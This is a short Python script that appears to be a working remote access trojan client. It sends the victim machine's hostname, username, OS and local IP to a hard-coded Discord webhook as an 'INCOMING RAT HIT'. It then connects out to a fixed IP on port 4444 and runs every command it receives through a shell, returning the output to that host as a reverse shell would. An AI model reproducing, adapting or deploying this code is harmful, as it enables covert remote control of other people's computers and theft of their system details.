import socket
import subprocess
import requests
import platform
import getpass

def start_client():
    # Discord Webhook URL - put your webhook here!
    webhook_url = "https://discord.com/api/webhooks/1404884748232298586/oNAip9LHAohoNjfge5I4GHtDDHhhXQKt97K1qjLxkR8OflX4fJjjykZCU61OCtbmnf-V"

    # Get the system info you want to send
    hostname = socket.gethostname()
    username = getpass.getuser()
    os_info = platform.platform()
    local_ip = socket.gethostbyname(hostname)

    # Make the message for Discord
    message = {
        "content": "INCOMING RAT HIT 🐀🚨\n**Hostname:** " + hostname + "\n**Username:** " + username + "\n**OS:** " + os_info + "\n**Local IP:** " + local_ip
    }

    # Send the hit to Discord
    try:
        requests.post(webhook_url, json=message)
    except Exception as e:
        # If it fails, who cares? The main program will still run.
        pass

    # Your original connection code is still here, after the webhook is sent
    host = '162.120.187.61'
    port = 4444

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((host, port))
    except Exception as e:
        return

    while True:
        command = client.recv(1024).decode()
        if command == 'exit':
            break

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            client.send(output)
        except Exception as e:
            client.send(str(e).encode())

    client.close()

if __name__ == "__main__":
    start_client()